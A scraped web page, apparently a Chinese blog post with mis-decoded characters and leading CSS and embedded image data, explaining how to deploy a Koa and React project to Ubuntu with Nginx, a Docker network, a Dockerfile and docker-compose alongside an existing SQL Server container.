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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å‰è¨€:
ubuntuæœåŠ¡å™¨ç°åœ¨å·²ç»ç”¨dockerå¯åŠ¨äº†ä¸€ä¸ªsql serveräº†ï¼Œæˆ‘ç°åœ¨æƒ³æŠŠæœ¬åœ°çš„koa+sql server+reacté¡¹ç›®éƒ¨ç½²åˆ°ubuntuä¸­ï¼Œreactå‰ç«¯ç›´æ¥æ‰“åŒ…ä¸Šä¼ åˆ°æœåŠ¡å™¨é€šè¿‡nginxå»è®¿é—®ï¼Œåç«¯çš„è¯é€šè¿‡dockeræ¥éƒ¨ç½²è¦æ€ä¹ˆæï¼Œä¸»è¦æ•°æ®åº“æ–¹é¢ä¸çŸ¥é“è¦æ€ä¹ˆå¼„?</p>
</blockquote>
<p>ç›®å‰æ˜¯ï¼š</p>
<ul>
<li>
<p>âœ… Ubuntu æœåŠ¡å™¨<strong>å·²ç»ç”¨ Docker è·‘äº†ä¸€ä¸ª SQL Server</strong></p>
</li>
<li>
<p>âœ… æœ¬åœ°æœ‰ï¼š</p>
<ul>
<li>Koaï¼ˆNode åç«¯ï¼‰</li>
<li>Reactï¼ˆå‰ç«¯ï¼‰</li>
<li>SQL Serverï¼ˆæœ¬åœ°å¼€å‘ç”¨ï¼‰</li>
</ul>
</li>
</ul>
<p>ä½ æƒ³è¦çš„æœ€ç»ˆå½¢æ€æ˜¯ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">æµè§ˆå™¨
  â†“
Nginxï¼ˆ<span class="hljs-number">9527</span> æˆ– <span class="hljs-number">80</span>ï¼‰
  â†“
React é™æ€æ–‡ä»¶
  â†“
/api â†’ Nginx â†’ Koaï¼ˆDockerï¼‰
                  â†“
              SQL <span class="hljs-built_in">Server</span>ï¼ˆDockerï¼‰
</code></pre>
<p><strong>è¿™æ˜¯å®Œå…¨æ­£ç¡®ã€ä¹Ÿæ˜¯æ¨èçš„éƒ¨ç½²æ–¹å¼ã€‚</strong></p>
<hr/>
<h3 data-id="heading-0">æ€»ä½“æ¨èæ¶æ„</h3>
<blockquote>
<p><strong>å‰ç«¯ä¸ç”¨ Dockerï¼Œåç«¯ + æ•°æ®åº“ç”¨ Dockerï¼ŒNginx åšç»Ÿä¸€å…¥å£</strong></p>
</blockquote>
<pre><code class="hljs language-arduino" lang="arduino">Ubuntu
â”œâ”€ nginxï¼ˆå®¿ä¸»æœºï¼‰
â”‚
â”œâ”€ /opt/translationfront/        â† React build
â”‚
â”œâ”€ docker
â”‚   â”œâ”€ sqlserver å®¹å™¨
â”‚   â””â”€ koa-backend å®¹å™¨
â”‚        |
â”‚        â””â”€â”€ é€šè¿‡ Docker ç½‘ç»œè®¿é—® SQL <span class="hljs-built_in">Server</span>
</code></pre>
<hr/>
<h3 data-id="heading-1">React å‰ç«¯</h3>
<h4 data-id="heading-2">æœ¬åœ°æ‰“åŒ…</h4>
<pre><code class="hljs language-arduino" lang="arduino">npm run build
</code></pre>
<p>æ³¨æ„ <code>package.json</code>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"homepage"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"translationfront"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>æ³¨æ„<code>app.js</code></p>
<pre><code class="hljs language-xml" lang="xml"> <span class="hljs-tag">&lt;<span class="hljs-name">Router</span> <span class="hljs-attr">basename</span>=<span class="hljs-string">"/translationfront"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"/"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>} /&gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"*"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">NotFound</span> /&gt;</span>} /&gt;
      <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">Router</span>&gt;</span>
</code></pre>
<p>ğŸ‘‰ å‰ç«¯è¿™éƒ¨åˆ†å·²ç»ç»“æŸã€‚</p>
<hr/>
<h3 data-id="heading-3">é‡ç‚¹æ¥äº†ï¼šåç«¯ + SQL Server æ€ä¹ˆæï¼ˆæ ¸å¿ƒï¼‰</h3>
<p>ä½ å·²ç»åœ¨ Ubuntu ä¸Šç”¨ Docker è·‘äº† SQL Server<br/>
ğŸ‘‰ <strong>è¿™æ˜¯éå¸¸å¥½çš„äº‹æƒ…</strong></p>
<h3 data-id="heading-4">å…³é”®åŸåˆ™ï¼ˆå…ˆè®°ä½ï¼‰</h3>
<blockquote>
<p>â— <strong>åç«¯ä¸è¦å†èµ·ä¸€ä¸ªæ–°çš„ SQL Server</strong></p>
<p>ğŸ‘‰ <strong>Koa å®¹å™¨ç›´æ¥è¿â€œå·²ç»å­˜åœ¨çš„ SQL Server å®¹å™¨â€</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-5">æœ€å…³é”®çš„ä¸€æ­¥ï¼š<strong>Docker ç½‘ç»œï¼ˆè§£å†³æ•°æ®åº“é—®é¢˜ï¼‰</strong></h3>
<blockquote>
<p>å®é™…éƒ¨ç½²è¿‡ç¨‹ä¸­å‘ç°ä¸éœ€è¦å¤„ç†æ•°æ®åº“è¿™ä¸€æ­¥ï¼Œè‡ªåŠ¨å°±è¿ä¸Šäº†æ•°æ®åº“ã€‚</p>
</blockquote>
<h4 data-id="heading-6">âŒ æ–°æ‰‹æœ€å¸¸çŠ¯çš„é”™</h4>
<ul>
<li>ç”¨ <code>localhost</code></li>
<li>ç”¨æœåŠ¡å™¨å…¬ç½‘ IP</li>
<li>ç«¯å£ä¹±æš´éœ²</li>
</ul>
<h3 data-id="heading-7">æ­£ç¡®åšæ³•ï¼šåˆ›å»ºä¸€ä¸ª docker ç½‘ç»œï¼ˆåªéœ€ä¸€æ¬¡ï¼‰</h3>
<pre><code class="hljs language-lua" lang="lua">docker network <span class="hljs-built_in">create</span> oa-net
</code></pre>
<hr/>
<h3 data-id="heading-8">æŠŠ SQL Server åŠ å…¥è¿™ä¸ªç½‘ç»œ</h3>
<pre><code class="hljs language-arduino" lang="arduino">docker network connect oa-net mssql
</code></pre>
<h3 data-id="heading-9">æ–°å»ºDockerfile.backend</h3>
<pre><code class="hljs language-bash" lang="bash">FROM node:24-alpine
WORKDIR /app

<span class="hljs-comment"># å¤åˆ¶ package.json å’Œ package-lock.json åˆ°é•œåƒä¸­</span>
COPY package*.json ./
<span class="hljs-comment"># å®‰è£…ç”Ÿäº§æ‰€éœ€çš„ä¾èµ–åŒ…ï¼Œè·³è¿‡å¼€å‘ä¾èµ–ï¼›--omit=devå¿½ç•¥å¼€å‘ä¾èµ–ï¼›npm ciå°±æ˜¯npm clean install</span>
<span class="hljs-comment"># RUN npm ci --omit=dev</span>

<span class="hljs-comment"># å®‰è£…é¡¹ç›®ä¾èµ–ï¼Œä¸è·³è¿‡å¼€å‘ä¾èµ–</span>
RUN npm ci

<span class="hljs-comment"># å¤åˆ¶ server ç›®å½•åˆ°é•œåƒä¸­</span>
COPY server/ ./server/

<span class="hljs-comment"># åˆ›å»ºç”¨æˆ·å’Œç»„ï¼Œå¹¶è®¾ç½®æƒé™</span>
RUN addgroup -g 1001 -S nodejs &amp;&amp; \
    adduser -S nodejs -u 1001 &amp;&amp; \
    <span class="hljs-built_in">chown</span> -R nodejs:nodejs /app

USER nodejs

EXPOSE 6051
ENV NODE_ENV=production
ENV PORT=6051

<span class="hljs-comment"># æŒ‡å®šå¯åŠ¨å‘½ä»¤</span>
CMD [<span class="hljs-string">"node"</span>, <span class="hljs-string">"server/server.js"</span>]
</code></pre>
<h3 data-id="heading-10">æ–°å»ºdocker-compose.yml</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment">#version: '3.3'</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-attr">backend:</span>
    <span class="hljs-attr">build:</span>
      <span class="hljs-attr">context:</span> <span class="hljs-string">.</span>
      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">Dockerfile.backend</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"6051:6051"</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
</code></pre>
